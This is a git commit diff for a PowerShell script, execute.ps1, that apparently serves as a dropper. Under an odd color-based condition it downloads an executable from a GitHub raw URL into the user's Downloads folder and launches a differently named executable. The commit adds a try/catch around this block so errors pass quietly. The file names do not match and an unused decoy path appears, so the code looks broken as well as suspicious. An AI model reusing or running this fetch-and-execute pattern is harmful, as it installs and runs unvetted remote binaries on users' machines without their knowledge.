a2f258b083d90a4ea43c6775cd47256d06d74d63
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-11 22:53:02 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -19,27 +19,31 @@ if ($initialColor -eq "blue") {
         Start-Sleep -Seconds 2
     }
 } elseif ($initialColor -eq "white") {
-    $urls = @(
-        "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
-    )
+    try {
+        $urls = @(
+            "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
+        )
 
-    $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+        $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
 
-    Start-Sleep -Seconds 1
+        Start-Sleep -Seconds 1
 
-    $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
-    if (-not (Test-Path -Path $downloadDir)) {
-        New-Item -ItemType Directory -Path $downloadDir
+        $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+        if (-not (Test-Path -Path $downloadDir)) {
+            New-Item -ItemType Directory -Path $downloadDir
+        }
+
+        foreach ($url in $urls) {
+            $fileName = [System.IO.Path]::GetFileName($url)
+            $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+            Invoke-WebRequest -Uri $url -OutFile $destinationPath
+        }
+
+        $exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
+        Start-Process -FilePath $exePath
+    } catch {
+        Write-Host "An error occurred: $_"
     }
-
-    foreach ($url in $urls) {
-        $fileName = [System.IO.Path]::GetFileName($url)
-        $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
-        Invoke-WebRequest -Uri $url -OutFile $destinationPath
-    }
-
-    $exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
-    Start-Process -FilePath $exePath
 }
 
 Start-Sleep -Seconds 1
